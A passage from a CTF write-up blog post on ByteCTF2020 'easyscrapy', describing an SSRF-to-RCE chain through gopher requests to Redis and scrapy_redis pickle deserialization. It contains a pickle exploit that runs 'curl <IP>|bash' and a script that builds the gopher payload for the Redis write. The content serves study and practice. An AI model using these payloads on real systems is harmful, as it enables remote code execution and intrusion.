+<p>不过这里redis因为lpop这个操作。导致我写入的这个list很快就会消失。它存的也不是pickle数据。那么要怎么rce?此时再度陷入僵局</p>
+<p>此时官方放出第三个hint scrapy_redis,题目仍是0解。我开始想scrapy_redis我第一天上午就发现了还需要提示？但是转念想会不会我想要的pickle操作存在于scrapy_redis呢？</p>
+<p><a href="https://github.com/rmax/scrapy-redis" target="_blank" rel="noopener">https://github.com/rmax/scrapy-redis</a></p>
+<p>于是。我用scrapy-redis github上的example-project跑了遍。这个demo是指定了url一直在爬的。于是当我连进redis时，我发现了3个键。并且当我查看他们的时候,终于发现了心心念念的内容也就是pickle的序列化数据。<br><img src="https://i.imgur.com/CwJ70OW.png" alt></p>
+<p>既然存在pickle序列化的数据。那么必然某个地方会反序列化它。这样一来rce的链条立马就清楚了。设置键 -&gt; pickle rce 跟pwnhub6月赛差不多了。</p>
+<p>但是本地为什么没有<code>byte:requests</code>出现呢？我怀疑是因为每次只传入一个url。导致存活时间极短。那么我们不妨用大量数据填充进redis。方法也很简单，上面的脚本加个for循环200次就好了。然后我们在redis里执行几次看看<code>zrange byte:requests 0 1</code><br><img src="https://i.imgur.com/hkiEKsi.png" alt></p>
+<p>既然如此。利用链就清楚了：想办法写入<code>byte:requests</code>键，内容为序列化数据。<br>而写入键唯有pycurl的ssrf可以做到。</p>
+<p>下面就是利用了</p>
+<h2 id="ssrf-gt-rce-exploit"><a href="#ssrf-gt-rce-exploit" class="headerlink" title="ssrf -&gt; rce exploit"></a>ssrf -&gt; rce exploit</h2><p>这里我们首先尝试一下直接写入byte:requests会怎么样。然后惊喜的发现只要写入就会直接触发反序列化。那么也就是说直接利用<code>/result?url</code>就可以打了。</p>
+<p>然后推测一波版本，这里我打远程用的protocol协议为2.0的pickle成功了。当时getshell没看python版本,估计是2.7.(scrapy 一般在2.7 或3.5/3.6跑)</p>
+<p>一个比较头疼的点是如何写入opcode的16进制数据。之前pwnhub6月赛时写pickle数据是因为crlf比较简单。可以直接加个引号括起来写。这里我们只能gopher打。那么转数据时出了不少麻烦。最后我简单改了下redis-ssrf这个脚本的内容。用python2 跑。确认它不会像python3那样自动转义我的16进制字符串。终于构造出可以打的payload</p>
+<p>python3 运行以得到pickle 16进制序列化数据。py2的直接写貌似有点问题。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl 120.27.246.202|bash"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e,protocol=<span class="number">2</span>)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+<p>python2 运行 convert.py<br>注意我们执行的是zadd。因为之前本地已经知道了requests是zset类型数据。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(key,payload)</span>:</span></span><br><span class="line">    cmd=[</span><br><span class="line">    <span class="string">"zadd &#123;0&#125; 1 &#123;1&#125;"</span>.format(key,payload),</span><br><span class="line">    <span class="string">"quit"</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x)))+CRLF+x</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span><span class="params">()</span>:</span></span><br><span class="line">    key = <span class="string">"byte:requests"</span></span><br><span class="line">    payload =<span class="string">"""\x80\x02cposix\nsystem\nq\x00X\x18\x00\x00\x00curl 120.27.246.202|bashq\x01\x85q\x02Rq\x03."""</span>.replace(<span class="string">' '</span>,<span class="string">'\x12'</span>)</span><br><span class="line">    cmd=set_key(key,payload)</span><br><span class="line">    protocol=<span class="string">"gopher://"</span></span><br><span class="line"></span><br><span class="line">    ip=<span class="string">"172.20.0.7"</span></span><br><span class="line">    port=<span class="string">"6379"</span></span><br><span class="line"></span><br><span class="line">    payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += quote(redis_format(x).replace(<span class="string">"^"</span>,<span class="string">" "</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    passwd = <span class="string">''</span></span><br><span class="line">    p=generate_payload()</span><br><span class="line">    print(p.replace(<span class="string">'%12'</span>,<span class="string">'%20'</span>))</span><br></pre></td></tr></table></figure>
+<p>一个小坑是我的空格总是会被错转。于是干脆先把空格填充一下最后再换回<code>%20</code>即可。</p>
+<p>打本地成了后，远程必然没有问题了。<br>最后因为get传参,我们注意二次url编码即可。执行命令<code>curl xxx|bash</code><br>(读文件确认有bash,pycurl确认有curl,同时之前把命令往tmp下写时发现有readflag)</p>
+<p>getshell :)<br><img src="https://i.imgur.com/7afkg9s.png" alt></p>
+<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  所以非常可惜。利用链想好后结果去赶飞机错过了比赛中解出的机会。不过思路还是很考验人的。题目质量很高。就是本地环境有点磨人。。。</p>
+<p>最后分享下我按照源码搭好的docker环境。<br><a href="https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy" target="_blank" rel="noopener">https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+          
+        
+          
+            <p>本文永久链接是：<a href=https://www.bycsec.top/2020/10/26/ByteCTF2020-easyscrapy/>https://www.bycsec.top/2020/10/26/ByteCTF2020-easyscrapy/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-10-26T22:41:18+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Oct 26, 2020</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WEB/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WEB</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/wp/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>wp</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/redis/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>redis</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+            
+              <a class='next' href='/2020/10/19/N1CTF2020/'>
+                <p class='title'>N1CTF2020<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>  N1CTF的题目质量毋庸置疑,可惜自己能力不足。除了签到还看了easytp5,filters,还有渗透系列的Victim.基本都没思路或者思路跑偏了……抓紧复现下来学习学习。
+
+
+signi...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+          </div>
+        </section>
+      
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+
+  <script>
+    window.subData = {
+      title: 'ByteCTF2020-easyscrapy',
+      tools: true
+    }
+  </script>
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+  <section class="widget toc-wrapper shadow desktop mobile">
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#fuzz"><span class="toc-text">fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-source-code"><span class="toc-text">leak source code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Run-it-locally"><span class="toc-text">Run it locally</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-gt-rce-exploit"><span class="toc-text">ssrf -&gt; rce exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <div class="aplayer-container">
+          
+
+
+        </div>
+      
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:895531613@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/baiyecha404"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+        </div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>
+
+        </div>
+      
+    
+      
+        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
+        , total visits
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          times
+        
+      
+    
+  </footer>
+
+<script>setLoadingBarProgress(80);</script>
+
+
+      <script>setLoadingBarProgress(60);</script>
+    </div>
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    $(function() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '8px',
+        duration: '800',
+        interval: '100',
+        scale: '1'
+      });
+    });
+  </script>
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('') {
+          $('').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>
+
+  
+  <script>
+  var GUEST_INFO = ['nick','mail','link'];
+  var meta = 'nick,mail,link'.split(',').filter(function(item){
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick','mail','link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function(item){
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+  var valine = new Valine();
+  function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+  }
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+  valine.init({
+    el: '#valine_container',
+    meta: meta,
+    
+    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
+    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
+    placeholder: "快来评论吧~",
+    pageSize:'10',
+    avatar:'robohash',
+    lang:'zh-cn',
+    visitor: 'true',
+    highlight: 'true',
+    mathJax: 'false',
+    enableQQ: 'true',
+    requiredFields: requiredFields,
+    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
+    emojiMaps: emojiMaps
+  })
+  </script>
+
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-check-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-check-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('fa-copy');
+        $icon.addClass('fa-times-circle');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('fa-times-circle');
+          $icon.addClass('fa-copy');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+
+<!-- fancybox -->
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  let LAZY_LOAD_IMAGE = "";
+  $(".article-entry").find("div.fancybox").find("img").each(function () {
+      var element = document.createElement("a");
+      $(element).attr("data-fancybox", "gallery");
+      $(element).attr("href", $(this).attr("src"));
+      /* 图片采用懒加载处理时,
+       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
+       * 那么此处将原本的属性名src替换为对应属性名data-original,
+       * 修改如下
+       */
+       if (LAZY_LOAD_IMAGE) {
+         $(element).attr("href", $(this).attr("data-original"));
+       }
+      $(this).wrap(element);
+  });
+</script>
+
+
+
+
+
+
+  <script>setLoadingBarProgress(100);</script>
+</body>
+</html>
